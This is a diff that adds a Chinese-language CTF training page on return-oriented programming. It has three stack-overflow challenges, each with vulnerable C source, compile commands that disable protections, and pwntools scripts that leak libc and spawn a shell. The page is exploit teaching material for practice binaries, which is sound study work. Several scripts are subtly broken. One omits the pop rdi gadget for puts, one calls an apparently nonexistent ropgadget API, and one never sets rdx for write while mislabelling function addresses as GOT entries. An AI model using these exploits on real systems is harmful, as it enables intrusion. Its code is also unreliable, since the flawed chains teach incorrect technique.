@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CTF-Pwn ROP 实战</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <style>
+    code {
+      background: rgba(0,0,0,0.3);
+      padding: 2px 6px;
+      border-radius: 4px;
+    }
+    pre {
+      background: #1a1a1a;
+      padding: 1rem;
+      border-radius: 8px;
+      overflow-x: auto;
+    }
+    pre code {
+      background: none;
+      padding: 0;
+    }
+  </style>
+</head>
+<body class="min-h-screen bg-gray-900 text-gray-200 p-6 font-mono selection:bg-blue-500/30">
+  <div class="max-w-6xl mx-auto space-y-6">
+    
+    <div class="border-b border-gray-700 pb-4">
+      <a href="ctf-index.html" class="text-blue-400 hover:text-blue-300 text-sm flex items-center gap-1 mb-2">
+        <i data-lucide="arrow-left" class="w-4 h-4"></i>
+        返回CTF实战首页
+      </a>
+      <h1 class="text-2xl font-bold text-white flex items-center gap-2">
+        <i data-lucide="git-branch" class="w-6 h-6 text-green-400"></i>
+        CTF-Pwn ROP 实战
+      </h1>
+      <p class="text-gray-400 mt-2">学习Return-Oriented Programming，绕过DEP防护。</p>
+    </div>
+
+    <!-- ROP基础说明 -->
+    <div class="bg-blue-900/20 border border-blue-800/50 rounded-lg p-4">
+      <h3 class="text-blue-400 font-bold mb-2">ROP (Return-Oriented Programming) 原理</h3>
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
+        <div class="bg-gray-900/50 rounded p-3">
+          <div class="text-yellow-400 font-bold">为什么需要ROP？</div>
+          <p class="text-gray-400">现代系统有DEP/NX防护，栈上代码不可执行。ROP通过拼接已有代码片段(gadgets)来构建攻击。</p>
+        </div>
+        <div class="bg-gray-900/50 rounded p-3">
+          <div class="text-yellow-400 font-bold">什么是Gadget？</div>
+          <p class="text-gray-400">程序中以 <code>ret</code> 结尾的短指令序列。通常是 <code>pop xxx; ret</code> 或 <code>mov xxx; ret</code>。</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Challenge 1 -->
+    <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+      <div class="flex items-center gap-3 mb-4">
+        <div class="w-10 h-10 bg-green-900/50 rounded-lg flex items-center justify-center text-white font-bold">1</div>
+        <div>
+          <h3 class="text-xl font-bold text-white">challenge1 - ret2libc 基础</h3>
+          <span class="text-xs text-green-400">入门</span>
+        </div>
+      </div>
+
+      <div class="mb-6">
+        <h4 class="text-green-400 font-bold mb-2">源码 (rop1.c)</h4>
+        <pre><code class="text-gray-300">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void vuln() {
+    char buf[64];
+    gets(buf);
+}
+
+int main() {
+    printf("ROP Challenge 1 - ret2libc\n");
+    vuln();
+    return 0;
+}</code></pre>
+        <div class="mt-3 bg-yellow-900/20 border border-yellow-800/50 rounded p-3 text-sm">
+          <div class="text-yellow-400 font-bold mb-1">漏洞分析</div>
+          <ul class="text-gray-300 space-y-1">
+            <li><span class="text-red-400">漏洞点：</span><code>gets(buf)</code> 栈溢出</li>
+            <li><span class="text-green-400">利用方法：</span>返回到libc中的system函数</li>
+            <li><span class="text-blue-400">关键：</span>64位系统调用约定：<code>rdi</code> = 第1个参数</li>
+            <li><span class="text-purple-400">需泄露：</code>libc基地址（通过write或printf）</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="mb-6">
+        <h4 class="text-blue-400 font-bold mb-2">编译命令</h4>
+        <div class="bg-gray-900 rounded p-3 text-sm">
+          <code class="text-green-300">gcc -no-pie -fno-stack-protector -z execstack -o rop1 rop1.c</code>
+          <div class="text-gray-400 text-xs mt-2">注意：保留puts/write函数用于泄露libc地址</div>
+        </div>
+      </div>
+
+      <div>
+        <h4 class="text-red-400 font-bold mb-2">Python 解题脚本</h4>
+        <pre><code class="text-gray-300">#!/usr/bin/env python3
+from pwn import *
+
+# 本地进程
+p = process('./rop1')
+elf = ELF('./rop1')
+
+# ========== 第一步：泄露 libc 地址 ==========
+# 获取puts在got中的地址
+puts_got = elf.got['puts']
+puts_plt = elf.plt['puts']
+print(f"puts @ PLT: {hex(puts_plt)}, GOT: {hex(puts_got)}")
+
+# 返回地址填充到vuln函数之后
+# 由于没有libc，我们需要先泄露
+# 构造ROP链：返回地址指向puts_plt，执行完后返回到main继续利用
+vuln_addr = elf.symbols['vuln']
+
+payload = b'A' * 72                                    # 填充
+payload += p64(puts_plt)                               # 调用puts
+payload += p64(vuln_addr)                             # 返回到vuln继续溢出
+payload += p64(puts_got)                               # puts的参数 = puts@got = 实际puts地址
+
+p.sendline(payload)
+p.recvuntil("ROP Challenge 1 - ret2libc\n")           # 跳过输出
+
+# 接收泄露的puts地址
+leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
+print(f"Leaked puts address: {hex(leaked_puts)}")
+
+# ========== 第二步：计算 system 和 /bin/sh ==========
+# 假设ASLR偏移固定（新手题目通常如此）
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')         # 加载libc
+libc.address = leaked_puts - libc.symbols['puts']      # 计算libc基地址
+
+system_addr = libc.symbols['system']
+bin_sh = next(libc.search(b'/bin/sh'))
+print(f"system: {hex(system_addr)}, /bin/sh: {hex(bin_sh)}")
+
+# ========== 第三步：getshell ==========
+payload = b'A' * 72
+payload += p64(system_addr)                            # 调用system
+payload += p64(0xdeadbeef)                            # 返回地址（无所谓）
+payload += p64(bin_sh)                                 # 参数: /bin/sh
+
+p.sendline(payload)
+p.interactive()</code></pre>
+        <div class="mt-3 bg-gray-900/50 rounded p-3 text-sm">
+          <div class="text-yellow-400 font-bold mb-1">脚本解释</div>
+          <ul class="space-y-1 text-gray-300">
+            <li><code>elf.got['puts']</code> - 从ELF获取puts的GOT地址</li>
+            <li><code>elf.plt['puts']</code> - puts的PLT地址（跳转到这里执行）</li>
+            <li><code>u64(p.recvline()...)</code> - 解析泄露的64位地址</li>
+            <li><code>libc.address = leaked - libc.symbols['puts']</code> - 计算libc基地址</li>
+            <li><strong>ROP链结构：</strong><code>[填充][函数地址][返回地址][参数]</code></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <!-- Challenge 2 -->
+    <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+      <div class="flex items-center gap-3 mb-4">
+        <div class="w-10 h-10 bg-yellow-900/50 rounded-lg flex items-center justify-center text-white font-bold">2</div>
+        <div>
+          <h3 class="text-xl font-bold text-white">challenge2 - ROPgadget 搜索</h3>
+          <span class="text-xs text-yellow-400">进阶</span>
+        </div>
+      </div>
+
+      <div class="mb-6">
+        <h4 class="text-green-400 font-bold mb-2">源码 (rop2.c)</h4>
+        <pre><code class="text-gray-300">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+char buf[32];
+
+void win() {
+    system("/bin/sh");
+}
+
+void vuln() {
+    memset(buf, 0, sizeof(buf));
+    gets(buf);
+}
+
+int main() {
+    printf("ROP Challenge 2 - Find gadgets!\n");
+    printf("buf at: %p\n", buf);
+    vuln();
+    return 0;
+}</code></pre>
+        <div class="mt-3 bg-yellow-900/20 border border-yellow-800/50 rounded p-3 text-sm">
+          <div class="text-yellow-400 font-bold mb-1">漏洞分析</div>
+          <ul class="text-gray-300 space-y-1">
+            <li><span class="text-green-400">利用方法：</span>直接返回到win()函数</li>
+            <li><span class="text-blue-400">难度：</span>需要使用ROPgadget搜索 <code>pop rdi; ret</code></li>
+            <li><span class="text-purple-400">搜索命令：</span><code>ROPgadget --binary rop2 | grep pop</code></li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="mb-6">
+        <h4 class="text-blue-400 font-bold mb-2">编译命令</h4>
+        <div class="bg-gray-900 rounded p-3 text-sm">
+          <code class="text-green-300">gcc -no-pie -fno-stack-protector -o rop2 rop2.c</code>
+          <div class="text-gray-400 text-xs mt-2">注意：不加-z execstack，因为我们要用ROP而非栈执行</div>
+        </div>
+      </div>
+
+      <div>
+        <h4 class="text-red-400 font-bold mb-2">Python 解题脚本</h4>
+        <pre><code class="text-gray-300">#!/usr/bin/env python3
+from pwn import *
+
+p = process('./rop2')
+elf = ELF('./rop2')
+
+# 查找gadgets
+print("[*] Finding gadgets...")
+from ropgadget import ROPGadget
+rop = ROPGadget('./rop2')
+gadgets = rop.gadgets()
+
+# 找 pop rdi; ret
+pop_rdi = None
+for gadget in gadgets:
+    if gadget.values()[0].startswith('pop rdi'):
+        pop_rdi = gadget.values()[0].split()[0]
+        break
+
+if not pop_rdi:
+    # 或者手动搜索
+    pop_rdi = 0x401223  # 通过ROPgadget手动找到的地址
+
+win_addr = elf.symbols['win']
+print(f"win @ {hex(win_addr)}")
+print(f"pop rdi; ret @ {hex(pop_rdi)}")
+
+# 构造ROP链
+# pop rdi; ret 会把栈顶的值弹出到rdi（第一个参数）
+# 然后ret跳转到下一条指令（win）
+payload = b'A' * 40
+payload += p64(pop_rdi)           # pop rdi
+payload += p64(0xdeadbeef)       # 这个值会被pop到rdi（无用，但满足ret需要）
+payload += p64(win_addr)         # 返回到win()
+
+p.sendline(payload)
+p.interactive()</code></pre>
+        <div class="mt-3 bg-gray-900/50 rounded p-3 text-sm">
+          <div class="text-yellow-400 font-bold mb-1">手动搜索gadgets</div>
+          <div class="text-gray-300 space-y-1">
+            <div><code>ROPgadget --binary rop2 --only "pop|ret"</code></div>
+            <div><code>objdump -d rop2 | grep -A2 "pop\|ret"</code></div>
+            <div><code>readelf -s rop2 | grep FUNC</code></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Challenge 3 -->
+    <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+      <div class="flex items-center gap-3 mb-4">
+        <div class="w-10 h-10 bg-red-900/50 rounded-lg flex items-center justify-center text-white font-bold">3</div>
+        <div>
+          <h3 class="text-xl font-bold text-white">challenge3 - 构建完整ROP链</h3>
+          <span class="text-xs text-red-400">高阶</span>
+        </div>
+      </div>
+
+      <div class="mb-6">
+        <h4 class="text-green-400 font-bold mb-2">源码 (rop3.c)</h4>
+        <pre><code class="text-gray-300">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+void vuln() {
+    char buf[64];
+    read(0, buf, 128);  // 可以读入更多数据
+}
+
+int main() {
+    printf("ROP Challenge 3 - Build ROP chain!\n");
+    printf("GOT table:\n");
+    printf("puts:   %p\n", (void*)&printf);
+    printf("write: %p\n", (void*)&write);
+    vuln();
+    return 0;
+}</code></pre>
+        <div class="mt-3 bg-yellow-900/20 border border-yellow-800/50 rounded p-3 text-sm">
+          <div class="text-yellow-400 font-bold mb-1">漏洞分析</div>
+          <ul class="text-gray-300 space-y-1">
+            <li><span class="text-green-400">利用方法：</span>完整的ROP链调用system("/bin/sh")</li>
+            <li><span class="text-blue-400">关键gadgets：</span><code>pop rdi; ret</code>, <code>pop rsi; pop r15; ret</code></li>
+            <li><span class="text-purple-400">思路：</span>泄露write地址 → 计算libc → 调用system("/bin/sh")</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="mb-6">
+        <h4 class="text-blue-400 font-bold mb-2">编译命令</h4>
+        <div class="bg-gray-900 rounded p-3 text-sm">
+          <code class="text-green-300">gcc -no-pie -fno-stack-protector -o rop3 rop3.c</code>
+        </div>
+      </div>
+
+      <div>
+        <h4 class="text-red-400 font-bold mb-2">Python 解题脚本</h4>
+        <pre><code class="text-gray-300">#!/usr/bin/env python3
+from pwn import *
+
+p = process('./rop3')
+elf = ELF('./rop3')
+
+# ========== 第一步：泄露 libc ==========
+# 从输出中解析write的GOT地址
+p.recvuntil("write: ")
+write_got = int(p.recvline().strip(), 16)
+print(f"write @ GOT: {hex(write_got)}")
+
+# ROP gadgets
+POP_RDI = 0x401223      # pop rdi; ret
+POP_RSI_R15 = 0x401221  # pop rsi; pop r15; ret
+RET = 0x401224          # ret (用于栈对齐)
+
+# write(1, write_got, 8) - 输出write在内存中的地址
+payload = b'A' * 72
+payload += p64(POP_RDI)          # 设置第一个参数
+payload += p64(1)                # fd = 1 (stdout)
+payload += p64(POP_RSI_R15)     # 设置第二个参数
+payload += p64(write_got)        # buf = write_got地址
+payload += p64(8)                # count = 8字节
+payload += p64(elf.plt['write']) # 调用write打印地址
+payload += p64(elf.symbols['main']) # 返回main继续利用
+
+p.sendline(payload)
+
+# 解析泄露的write地址
+write_leaked = u64(p.recv(8))
+print(f"Leaked write: {hex(write_leaked)}")
+
+# ========== 第二步：计算libc ==========
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+libc.address = write_leaked - libc.symbols['write']
+system_addr = libc.symbols['system']
+bin_sh = next(libc.search(b'/bin/sh\x00'))
+print(f"system: {hex(system_addr)}, bin_sh: {hex(bin_sh)}")
+
+# ========== 第三步：调用 system("/bin/sh") ==========
+payload = b'A' * 72
+payload += p64(RET)              # 栈对齐（有时候需要）
+payload += p64(POP_RDI)
+payload += p64(bin_sh)          # rdi = "/bin/sh"
+payload += p64(system_addr)      # 调用system("/bin/sh")
+
+p.sendline(payload)
+p.interactive()</code></pre>
+        <div class="mt-3 bg-gray-900/50 rounded p-3 text-sm">
+          <div class="text-yellow-400 font-bold mb-1">64位函数调用约定 (System V AMD64 ABI)</div>
+          <ul class="space-y-1 text-gray-300">
+            <li><code>RDI</code> - 第1个参数</li>
+            <li><code>RSI</code> - 第2个参数</li>
+            <li><code>RDX</code> - 第3个参数</li>
+            <li><code>RCX</code> - 第4个参数</li>
+            <li><code>R8</code> - 第5个参数</li>
+            <li><code>R9</code> - 第6个参数</li>
+            <li><code>RAX</code> - 返回值</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <div class="flex justify-between">
+      <a href="ctf-format-string.html" class="bg-gray-700 hover:bg-gray-600 text-white py-2 px-4 rounded font-bold transition-all">
+        ← 格式化字符串实战
+      </a>
+      <a href="ctf-heap.html" class="bg-purple-700 hover:bg-purple-600 text-white py-2 px-4 rounded font-bold transition-all">
+        堆漏洞实战 →
+      </a>
+    </div>
+
+  </div>
+
+  <script>
+    lucide.createIcons();
+  </script>
+</body>
+</html>
